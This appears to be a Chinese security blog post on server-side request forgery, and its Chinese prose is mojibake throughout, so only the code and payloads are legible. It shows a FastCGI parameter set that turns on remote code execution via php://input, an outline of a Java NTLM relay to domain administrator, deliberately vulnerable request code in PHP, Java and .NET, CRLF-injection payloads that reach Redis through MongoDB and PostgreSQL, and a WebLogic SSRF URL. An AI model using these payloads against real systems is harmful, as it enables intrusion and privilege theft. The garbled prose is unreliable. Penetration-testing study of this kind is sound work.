<p>æœ€ç»ˆä¼šæ‰§è¡Œ<code>SCRIPT_FILENAME</code>å˜é‡æŒ‡å‘çš„æ–‡ä»¶ã€‚</p>
<p>è€Œfpmåœ¨é«˜ç‰ˆæœ¬é»˜è®¤é™åˆ¶äº†æ–‡ä»¶çš„åç¼€ã€‚</p>
<p>å…¶å®è‘—åçš„nginxè§£ææ¼æ´å°±æ˜¯fastcgiçš„pathinfo fixBugçš„é—®é¢˜ï¼Œå¯¼è‡´å¯ä»¥è§£æä»»æ„æ–‡ä»¶ã€‚è€Œå¢åŠ äº†è¿™ä¸ªä¿®å¤ä¹‹åï¼Œè§£ææ¼æ´å°±ä¸å†å­˜åœ¨äº†ï¼Œå› ä¸ºé™åˆ¶äº†åªå…è®¸è§£æphpæ–‡ä»¶ï¼ˆè¿™é‡ŒpğŸ‚çš„åšå®¢ä¹Ÿè¯´è¿‡ï¼Œå¯ä»¥å»çœ‹ä¸€ä¸‹ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">; Limits the extensions of the main script FPM will allow to parse. This can
; prevent configuration mistakes on the web server side. You should only limit
; FPM to .php extensions to prevent malicious users to use other extensions to
; exectute php code.
; Note: set an empty value to allow all extensions.
; Default Value: .php
;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åˆ°ç°åœ¨æˆ‘ä»¬å‘ç°å¯ä»¥ä¼ªé€ åè®®æ‰§è¡Œç³»ç»Ÿä¸Šçš„ä»»æ„phpæ–‡ä»¶ï¼Œä½†è¿™æ ·è¿˜æ˜¯å¾ˆé¸¡è‚‹ï¼Œcgiåè®®é‡Œé¢æœ‰æ²¡æœ‰å…¶ä»–å¯ä»¥è¢«åˆ©ç”¨çš„é…ç½®å‘¢ï¼Ÿ</p>
<p>è¿™å°±è¦è¯´å›PHPäº†ï¼ŒPHPçš„ç¯å¢ƒå˜é‡æœ‰ä¸¤é¡¹æ¯”è¾ƒæœ‰æ„æ€çš„é…ç½®ï¼š<code>auto_prepend_file</code>å’Œ<code>auto_append_file</code>ã€‚</p>
<p><code>auto_prepend_file</code>æ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«<code>auto_prepend_file</code>ä¸­æŒ‡å®šçš„æ–‡ä»¶</p>
<p><code>auto_append_file</code>æ˜¯å‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼ŒåŒ…å«<code>auto_append_file</code>æŒ‡å‘çš„æ–‡ä»¶ã€‚</p>
<p>å¦‚æœè®¾ç½®<code>auto_prepend_file</code>ä¸º<code>php://input</code>ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥æ‰§è¡Œpostçš„ä»£ç äº†ã€‚ï¼ˆå½“ç„¶ï¼Œè¿˜éœ€è¦å¼€å¯è¿œç¨‹æ–‡ä»¶åŒ…å«é€‰é¡¹<code>allow_url_include</code>ï¼‰</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨cgiåè®®ï¼Œè®¾ç½®è¿è¡Œçš„ç¯å¢ƒå˜é‡ï¼Œåˆ©ç”¨<code>PHP_VALUE</code>å’Œ<code>PHP_ADMIN_VALUE</code></p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,
    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,
    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,
    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,
    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,
    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
    &#39;SERVER_PORT&#39;: &#39;80&#39;,
    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;
    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,
    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ•´ä¸ªåˆ©ç”¨çº¿è·¯ä¹Ÿå°±æ‰“é€šäº†ï¼Œåˆ†æä¸Šé¢çš„æµç¨‹ä¹Ÿèƒ½å‘ç°ï¼Œåˆ©ç”¨æ˜¯è¦æœ‰å‰æçš„ï¼š</p>
<ul>
<li>éœ€è¦çŸ¥é“æœåŠ¡å™¨ä¸Šä¸€ä¸ªå·²çŸ¥çš„phpæ–‡ä»¶è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡æŠ¥é”™ï¼Œæˆ–è€…linuxå®‰è£…phpæ—¶è‡ªå¸¦çš„phpæ–‡ä»¶ã€‚</li>
</ul>
<p><strong>å› ä¸ºcgiæ¶‰åŠåˆ°ä¸¥æ ¼çš„æ ¼å¼é—®é¢˜ï¼Œå› æ­¤åªèƒ½åˆ©ç”¨åœ¨å¯æ„é€ å®Œæ•´äºŒè¿›åˆ¶æ•°æ®çš„ssrfç‚¹ï¼Œæ¯”å¦‚gopherã€‚</strong></p>
<h3 id="å…¶ä»–"><a class="markdownIt-Anchor" href="#å…¶ä»–"></a> å…¶ä»–</h3>
<p>å…¶å®ä¸Šé¢ä¸¾çš„å¸¸è§ä¾‹å­éƒ½æ˜¯å†…ç½‘ä¸­å¸¸è§çš„æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå…¶ä»–æœªæˆæƒæ¼æ´å½“ç„¶ä¹Ÿåœ¨ssrfçš„åˆ©ç”¨ä¸­ï¼Œæ¯”å¦‚hadoopç­‰ã€‚</p>
<p>æˆ–è€…å…¶ä»–å¯ä»¥ç›´æ¥æ„é€ pocçš„webç³»ç»Ÿï¼Œæ¯”å¦‚st2ã€Confluenceç­‰ï¼Œåªè¦å…¥å£ç‚¹å¯ä»¥æ„é€ å‡ºå¯¹åº”çš„æ•°æ®å³å¯ã€‚æ€è·¯è¦æ‰“å¼€ã€‚</p>
<h2 id="java-ssrfçš„ntlm-relay"><a class="markdownIt-Anchor" href="#java-ssrfçš„ntlm-relay"></a> java SSRFçš„NTLM relay</h2>
<p>javaçš„<code>sun.net.www.protocol.http.HttpURLConnection</code>å‘é€HTTPè¯·æ±‚æ—¶è¿”å›ä¸º401çš„HTTPè¿”å›å¤´æ—¶ï¼Œä¼šåˆ¤æ–­è¯¥é¡µé¢è¦æ±‚ä½¿ç”¨å“ªç§è®¤è¯æ–¹å¼ï¼Œè‹¥æ”»å‡»è€…å›å¤è¦æ±‚é‡‡ç”¨NTLMè®¤è¯åˆ™ä¼šè‡ªåŠ¨ä½¿ç”¨å½“å‰ç”¨æˆ·å‡­æ®è¿›è¡Œè®¤è¯ã€‚</p>
<p><strong>åœ¨ JDK 8u351 ä¸­å·²ç»ä¿®å¤ (é’ˆå¯¹ TrustedSites å¢åŠ äº† AuthMode å­—æ®µ, é»˜è®¤ä¸º <code>DISABLED</code>)ï¼Œä¸å†ä¼šé»˜è®¤å‘èµ·è®¤è¯</strong></p>
<p>è¿™ä¸ªåœ¨A-Teamçš„æ–‡ç« ä¸­æœ‰å®ä¾‹ï¼Œé¡ºä¾¿åˆ†æä¸€ä¸‹XXE  to RCEçš„è¿‡ç¨‹ã€‚</p>
<p>å†™æ–‡ç« çš„æ—¶å€™å‘ç°A-Teamå¤§æ¦‚ç¡®å®æ˜¯æ­»æ‰äº†ï¼š</p>
<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924152017492.png" alt="image-20240924152017492" /></p>
<p>è¿™æ˜¯ä¸€ç¯‡â€œä¸ä¸€æ ·â€çš„çœŸå®æ¸—é€æµ‹è¯•æ¡ˆä¾‹åˆ†ææ–‡ç« ï¼Œæœç´¢æ­¤å…³é”®å­—å³å¯ã€‚</p>
<ol>
<li>å…¥å£ç‚¹</li>
</ol>
<p>â€‹	æ–‡ä¸­çš„æ¼æ´ç‚¹æ˜¯webdavçš„xxeå¯¼è‡´çš„ssrfï¼ˆ<strong>æœåŠ¡æ˜¯systemæƒé™ï¼Œå‡ºç½‘ä¸ºæœºå™¨ç”¨æˆ·æƒé™ï¼Œiiså’Œserviceå‡ºç½‘ä¹Ÿä¸ºæœºå™¨ç”¨æˆ·æƒé™</strong>ï¼‰</p>
<ol start="2">
<li>
<p>æ— æ³•relayå›è‡ªèº«</p>
<p>relayæ˜¯æœºå™¨ç”¨æˆ·å‘èµ·ï¼Œå› æ­¤æ— æ³•relayå›è‡ªèº«è°ƒé«˜æƒé™rpcæ¥å£ã€‚</p>
</li>
<li>
<p>relayåˆ°ldap</p>
</li>
</ol>
<p>â€‹	å› ä¸ºæ˜¯æœºå™¨ç”¨æˆ·ï¼Œæœ‰æƒé™ä¿®æ”¹è‡ªèº«çš„Rbcdå±æ€§ï¼Œè¿™æ ·ä¿®æ”¹è‡ªå·±çš„å§”æ´¾å±æ€§ä¸ºæ¶æ„çš„æœºå™¨ç”¨æˆ·ï¼ˆè¿™é‡Œæœºå™¨ç”¨æˆ·å’ŒæœåŠ¡ç”¨æˆ·å‡å¯ï¼Œå› ä¸ºä¸€èˆ¬å…è®¸åŸŸç”¨æˆ·å»ºç«‹10ä¸ªæœºå™¨ç”¨æˆ·ï¼Œæ‰€ä»¥å¾€ä¸Šæ–‡ç« éƒ½æ˜¯æ–°å»ºæœºå™¨ç”¨æˆ·ï¼Œå®æˆ˜ä¸­ä¹Ÿå¯ä»¥é€‰æ‹©å·²ç»æ‹¿åˆ°çš„æœºå™¨ç”¨æˆ·å’ŒæœåŠ¡ç”¨æˆ·ï¼‰ã€‚</p>
<ol start="4">
<li>åˆ©ç”¨rbcdç‰¹æ€§ç”³è¯· é«˜æƒé™ç¥¨æ®</li>
</ol>
<p>â€‹	rbcdå¯ä»¥ç”³è¯·ä»»æ„ç”¨æˆ·åˆ°è¢«å§”æ´¾çš„æœåŠ¡çš„ç¥¨æ®ï¼Œå› æ­¤å¯ä»¥ç”³è¯·administratorç”¨æˆ·åˆ°ç›®æ ‡cifsæœåŠ¡çš„æƒé™ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†ç›®æ ‡æœºå™¨çš„æœ€é«˜æƒé™ã€‚</p>
<h1 id="0x02-ä»£ç æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#0x02-ä»£ç æ¡ˆä¾‹"></a> 0x02 ä»£ç æ¡ˆä¾‹</h1>
<h2 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h2>
<p><strong>file_get_contents</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>æ— å›æ˜¾ï¼ˆéœ€è¦ä»£ç ä¸­å†™å›æ˜¾ï¼‰</li>
<li>æ”¯æŒåè®®ï¼šhttpï¼ˆGETï¼‰ã€fileã€ftp</li>
</ul>
<p><strong>fsockopen</strong></p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
$host&#x3D;$_GET[&#39;url&#39;];
$fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) &#123;
    echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;
&#125; else &#123;
    $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;
    $out .&#x3D; &quot;Host: $host\r\n&quot;;
    $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;
    fwrite($fp, $out);
    while (!feof($fp)) &#123;
        echo fgets($fp, 128);
    &#125;
    fclose($fp);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>æ— å›æ˜¾ï¼ˆéœ€è¦ä»£ç ä¸­å†™å›æ˜¾ï¼‰</p>
</li>
<li>
<p>è‡ªå®šä¹‰tcpæ•°æ®æµï¼Œå¯å‘é€ä»»æ„æ•°æ®ã€‚ï¼ˆå…¶å®weblogicçš„ssrfå­˜åœ¨crlfä¹Ÿæ˜¯ç±»ä¼¼çš„åŸå› ï¼Œè‡ªå·±å°è£…äº†socketæ•°æ®ï¼‰</p>
</li>
</ul>
<p><strong>curl_exec()</strong></p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php 
$url&#x3D;$_POST[&#39;url&#39;]; 
$ch&#x3D;curl_init($url);  &#x2F;&#x2F;åˆ›é€ ä¸€ä¸ªcurlèµ„æº
curl_setopt($ch, CURLOPT_HEADER, 0); &#x2F;&#x2F;è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$result&#x3D;curl_exec($ch); &#x2F;&#x2F; æŠ“å–urlå¹¶å°†å…¶ä¼ é€’ç»™æµè§ˆå™¨
curl_close($ch); &#x2F;&#x2F;å…³é—­curlèµ„æº
echo ($result); 
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>
<p>æ— å›æ˜¾ï¼ˆéœ€è¦ä»£ç ä¸­å†™å›æ˜¾ï¼‰</p>
</li>
<li>
<p>æ”¯æŒåè®®ï¼šdictã€gopherã€httpã€fileã€ftp</p>
</li>
</ul>
<h2 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h2>
<p>javaçš„åè®®æ”¯æŒå°±æ¯”è¾ƒå°‘äº†ï¼Œä»¥1.8ä¸¾ä¾‹ï¼šhttpï¼Œhttpsï¼Œfileï¼Œftpï¼Œmailtoï¼Œjarï¼Œnetdocã€‚</p>
<p>å¯¹æ¯”phpæœ‰çµæ´»çš„gopherï¼Œjavaèƒ½åšçš„äº‹æƒ…å°±å¾ˆå°‘äº†ã€‚</p>
<p><strong>HttpURLConnection</strong></p>
<pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.net.HttpURLConnection;
import java.net.URL;

public class SSRFExample &#123;
    public void makeRequest(String userInput) throws Exception &#123;
        URL url &#x3D; new URL(userInput);
        HttpURLConnection connection &#x3D; (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(&quot;GET&quot;);
        int responseCode &#x3D; connection.getResponseCode();
        &#x2F;&#x2F; å¤„ç†å“åº”
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>URLConnection</strong></p>
<pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.net.URL;
import java.net.URLConnection;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SSRFExample &#123;
    public void makeRequest(String userInput) throws Exception &#123;
        URL url &#x3D; new URL(userInput);
        URLConnection connection &#x3D; url.openConnection();
        try (InputStream inputStream &#x3D; connection.getInputStream();
             BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(inputStream))) &#123;
            String line;
            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;
                &#x2F;&#x2F; å¤„ç†æ¯ä¸€è¡Œ
                System.out.println(line);
            &#125;
        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>Socket</strong></p>
<pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SSRFExample &#123;
    public void connectToServer(String userInput) throws Exception &#123;
        String[] parts &#x3D; userInput.split(&quot;:&quot;);
        String host &#x3D; parts[0]; &#x2F;&#x2F; ä¸»æœº
        int port &#x3D; Integer.parseInt(parts[1]); &#x2F;&#x2F; ç«¯å£
        
        try (Socket socket &#x3D; new Socket(host, port);
             OutputStream outputStream &#x3D; socket.getOutputStream();
             InputStream inputStream &#x3D; socket.getInputStream()) &#123;
             
            &#x2F;&#x2F; å‘é€è¯·æ±‚ï¼ˆæ ¹æ®åè®®ï¼‰
            String request &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\nHost: &quot; + host + &quot;\r\n\r\n&quot;;
            outputStream.write(request.getBytes());
            outputStream.flush();
            
            &#x2F;&#x2F; å¤„ç†å“åº”
            byte[] buffer &#x3D; new byte[1024];
            int bytesRead;
            while ((bytesRead &#x3D; inputStream.read(buffer)) !&#x3D; -1) &#123;
                System.out.write(buffer, 0, bytesRead);
            &#125;
        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="dotnet"><a class="markdownIt-Anchor" href="#dotnet"></a> Dotnet</h2>
<p>.NETä¹Ÿæ˜¯ç±»ä¼¼ï¼Œæ”¯æŒçš„åè®®æ¯”è¾ƒå°‘ï¼ŒFileã€Http</p>
<p><strong>HttpWebRequest</strong></p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;
using System.IO;
using System.Net;

public class SSRFExample
&#123;
    public void MakeRequest(string userInput)
    &#123;
        HttpWebRequest request &#x3D; (HttpWebRequest)WebRequest.Create(userInput);
        request.Method &#x3D; &quot;GET&quot;;

        using (HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse())
        using (StreamReader reader &#x3D; new StreamReader(response.GetResponseStream()))
        &#123;
            string responseText &#x3D; reader.ReadToEnd();
            &#x2F;&#x2F; å¤„ç†å“åº”
            Console.WriteLine(responseText);
        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>HttpClient</strong></p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;
using System.Net.Http;
using System.Threading.Tasks;

public class SSRFExample
&#123;
    private static readonly HttpClient client &#x3D; new HttpClient();

    public async Task MakeRequest(string userInput)
    &#123;
        HttpResponseMessage response &#x3D; await client.GetAsync(userInput);
        response.EnsureSuccessStatusCode();

        string responseBody &#x3D; await response.Content.ReadAsStringAsync();
        &#x2F;&#x2F; å¤„ç†å“åº”
        Console.WriteLine(responseBody);
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>WebClient</strong></p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;
using System.Net;

public class SSRFExample
&#123;
    public void MakeRequest(string userInput)
    &#123;
        using (WebClient client &#x3D; new WebClient())
        &#123;
            string response &#x3D; client.DownloadString(userInput);
            &#x2F;&#x2F; å¤„ç†å“åº”
            Console.WriteLine(response);
        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>TcpClient</strong></p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;
using System.Net.Sockets;
using System.Text;

public class SSRFExample
&#123;
    public void ConnectToServer(string userInput)
    &#123;
        string[] parts &#x3D; userInput.Split(&#39;:&#39;);
        string host &#x3D; parts[0];
        int port &#x3D; int.Parse(parts[1]);

        using (TcpClient client &#x3D; new TcpClient(host, port))
        using (NetworkStream stream &#x3D; client.GetStream())
        &#123;
            byte[] request &#x3D; Encoding.ASCII.GetBytes(&quot;GET &#x2F; HTTP&#x2F;1.1\r\nHost: &quot; + host + &quot;\r\n\r\n&quot;);
            stream.Write(request, 0, request.Length);
            
            &#x2F;&#x2F; å¤„ç†å“åº”
            byte[] buffer &#x3D; new byte[1024];
            int bytesRead &#x3D; stream.Read(buffer, 0, buffer.Length);
            Console.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead));
        &#125;
    &#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="0x03-æ¼æ´æ€»ç»“"><a class="markdownIt-Anchor" href="#0x03-æ¼æ´æ€»ç»“"></a> 0x03 æ¼æ´æ€»ç»“</h1>
<h2 id="å®æˆ˜ä¸­å¸¸è§å­˜åœ¨æ¼æ´çš„ç»„ä»¶"><a class="markdownIt-Anchor" href="#å®æˆ˜ä¸­å¸¸è§å­˜åœ¨æ¼æ´çš„ç»„ä»¶"></a> å®æˆ˜ä¸­å¸¸è§å­˜åœ¨æ¼æ´çš„ç»„ä»¶</h2>
<ul>
<li>
<p>ueditorï¼šå¯å›æ˜¾çš„ssrf</p>
</li>
<li>
<p>XXEï¼š systemçš„httpçš„ssrf</p>
</li>
<li>
<p>grafanaï¼šåå°å›æ˜¾ssrf</p>
</li>
<li>
<p>weblogicï¼šå­˜åœ¨crlfæ³¨å…¥çš„ssrfï¼Œå¯ä»¥æ‰“redis</p>
</li>
</ul>
<h3 id="æ•°æ®åº“"><a class="markdownIt-Anchor" href="#æ•°æ®åº“"></a> æ•°æ®åº“</h3>
<p>éƒ¨åˆ†æ•°æ®åº“ä¹Ÿå¯ä»¥å‘é€è¯·æ±‚ï¼Œå¯ä»¥ç”¨åœ¨æ•°æ®åº“æœªæˆæƒæˆ–è€…SQLæ³¨å…¥çš„åœºæ™¯ä¸­</p>
<p><strong>MongoDB</strong></p>
<p>db.copyDatabase(â€™\r\nconfig get dir\r\nquit\r\nâ€™,â€˜testâ€™,â€˜127.0.0.1:6379â€™)</p>
<p><strong>Oracle</strong></p>
<p>å†…ç½®çš„UTL_HTTPã€UTL_TCPã€UTL_SMTPç­‰æ–¹æ³•ï¼Œè¿™äº›ä¹ŸåŒæ—¶è¢«ç”¨åœ¨DNSå¤–å¸¦æ³¨å…¥æ•°æ®çš„åœºæ™¯</p>
<p><strong>PostgreSQL</strong></p>
<pre class="line-numbers language-none"><code class="language-none">SELECT dblink_send_query(
â€˜host&#x3D;127.0.0.1 

dbname&#x3D;quit 

user&#x3D;\&#39;\r\nconï¬g get dir\r\n\quit\r\nâ€™ 

password&#x3D;1 port&#x3D;6379 sslmode&#x3D;disableâ€™,

&#39;select version();â€™ 
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>Mysql</strong><br />
load_file</p>
<h2 id="åˆ©ç”¨æŠ€å·§"><a class="markdownIt-Anchor" href="#åˆ©ç”¨æŠ€å·§"></a> åˆ©ç”¨æŠ€å·§</h2>
<p><strong>ä¸€ã€åˆ©ç”¨crlf</strong></p>
<p>ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ï¼Œå­˜åœ¨crlfçš„ssrfå¯ä»¥è¢«ç”¨äºæ‰“æœ‰å¯†ç çš„redis</p>
<p><strong>äºŒã€åˆ©ç”¨é”šç‚¹</strong></p>
<p>ä¸šåŠ¡ä¸­å­˜åœ¨ssrfçš„ä»£ç é€šå¸¸éƒ½æ˜¯ ï¼šString url = ip + â€˜/aaaaaâ€™;</p>
<p>åªæœ‰ipå¯æ§ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é”šç‚¹çš„ç‰¹æ€§ï¼Œè®©åé¢çš„ä¸œè¥¿å’Œå‚æ•°ä¸å‘é€åˆ°æœåŠ¡ç«¯ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é‡‡å–å‚æ•°çš„æ–¹å¼ï¼Œä½†ä¸ªäººæ›´å–œæ¬¢é”šç‚¹çš„æ–¹å¼ï¼Œæœ‰æ—¶å€™æ‹¼æ¥çš„uriä¸çŸ¥é“éƒ½å¯èƒ½æœ‰ä»€ä¹ˆä¸œè¥¿ã€‚</p>
<p>127.0.0.1/#/aaaaa</p>
<p><strong>ä¸‰ã€å®æˆ˜ä¸­çš„ssrfåŒºåˆ†</strong></p>
<p>å…¶å®å®æˆ˜ä¸­çš„ssrfå¯ä»¥æŒ‰ç…§ä¸¤ç§æƒ…å†µå»åˆ†ã€‚</p>
<ul>
<li>1æ˜¯æ˜¯å¦å­˜åœ¨å›æ˜¾ï¼Œå›æ˜¾å¯ä»¥æ ¹æ®ç»“æœè·å–ä¿¡æ¯ï¼Œæ²¡æœ‰å›æ˜¾åªèƒ½å¸ƒå°”æˆ–è€…å»¶æ—¶åˆ¤æ–­ç»“æœäº†ã€‚</li>
<li>2æ˜¯æ˜¯å¦å¯ä»¥æ„é€ å®Œæ•´çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚gopherå°±å¯ä»¥æ„é€ å®Œæ•´çš„æ•°æ®ï¼Œå¯ä»¥è¢«ç”¨äºåœ¨ä¸¥æ ¼çš„åè®®ä¼ªé€ ä¸­ï¼Œæ¯”å¦‚ä¸Šé¢æåˆ°çš„cgiï¼Œå¦‚æœä¸èƒ½æ„é€ ï¼Œåªæœ‰ä¸€ä¸ªå‘èµ·GETè¯·æ±‚çš„ssrfç‚¹ï¼Œå°±åªèƒ½ç”¨äºæ”¯æŒGETçš„æ¼æ´åˆ©ç”¨ç‚¹äº†ã€‚</li>
</ul>
<p><strong>å››ã€CTFä¸­çš„æé™ç¯å¢ƒé…åˆFTPæ¨¡å¼çš„</strong></p>
<p>è¿™ä¸ªå®æˆ˜ä¸€æ¬¡æ²¡è§åˆ°è¿‡ï¼Œä½†æ˜¯ä¹‹å‰åˆ·åˆ°è¿‡ï¼Œè¿™æ¬¡æ€»ç»“é¡ºä¾¿æ”¾åœ¨è¿™é‡Œäº†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254387#h3-2">https://www.anquanke.com/post/id/254387#h3-2</a></p>
<h1 id="0x04-æ¼æ´å¸¸è§åˆ©ç”¨å®ä¾‹"><a class="markdownIt-Anchor" href="#0x04-æ¼æ´å¸¸è§åˆ©ç”¨å®ä¾‹"></a> 0x04 æ¼æ´å¸¸è§åˆ©ç”¨å®ä¾‹</h1>
<h2 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> weblogic</h2>
<p>weblogicçš„ssrfæ˜¯å­˜åœ¨crlfæ¼æ´çš„ï¼Œå…·ä½“åŸå› çœ‹è¿™ç¯‡ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p>
<p>æ€»ä¹‹å°±æ˜¯ç›´æ¥è°ƒç”¨äº†socketå‘é€æ•°æ®</p>
<p>ä¸è¿‡è¿™æ´æœ¬è´¨è¿˜æ˜¯æ„é€ äº†ä¸€ä¸ªPostçš„httpæ•°æ®åŒ…ï¼Œå› æ­¤ä¸èƒ½å®Œæ•´çš„æ„é€ å…¶ä»–çš„åè®®æ•°æ®ã€‚</p>
<p>å®æˆ˜ä¸­å°±æ‰“è¿‡redisï¼Œå…¶ä»–çš„åˆ©ç”¨ç›®å‰æ²¡æƒ³åˆ°ï¼Œå› ä¸ºè¿™ä¸ªæ´çš„postçš„dataä¹Ÿæ˜¯ä¸å¯æ§çš„ï¼Œå†…ç½®äº†soapæ•°æ®ã€‚</p>
<p>è¿™ä¸ªæ´ä¸¤ä¸‰å¹´å‰è¿˜æ˜¯é‡è§è¿‡ä¸å°‘ï¼Œç°åœ¨é‡è§çš„å¾ˆå°‘äº†ï¼Œå®¢æˆ·éƒ½ä¸ç”¨weblogicäº†ã€‚ã€‚ã€‚</p>
<p><code>http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://test.com/hello&amp;rdoSearch=name&amp;btnSubmit=Search</code></p>
